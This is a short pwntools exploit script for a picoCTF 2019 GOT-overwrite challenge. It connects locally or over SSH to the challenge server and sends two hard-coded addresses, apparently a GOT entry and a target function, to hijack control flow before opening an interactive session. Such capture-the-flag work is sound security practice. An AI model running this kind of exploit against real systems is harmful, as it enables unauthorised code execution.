import binascii
from pwn import *
import sys



BINARY = './vuln'
context.terminal = ['tmux', 'splitw', '-h']


def attach_gdb(sh):
    gdb.attach(sh)


def P32(v):
    return struct.pack('I', v)


def P64(v):
    return struct.pack('Q', v)


def deHex(v):
    return binascii.unhexlify(v)[::-1]




def start():
    if args["REMOTE"]:
        s = ssh(host='2019shell1.picoctf.com',
                user='mikon', password="password")
        sh = s.process(
            'vuln', cwd='/problems/got_0_4521f0cfb186aab8acc47d9abe572bdb')
    else:
        sh = process(BINARY, stdout=process.PTY, stdin=process.PTY)

    if args["GDB"]:
        attach_gdb(sh)
    return sh


def main():
	sh = start()


	sh.sendlineafter('\n', str(0x0804a01c))
	sh.sendlineafter('\n', str(0x080485c6))

	sh.interactive()





if __name__ == '__main__':
    main()



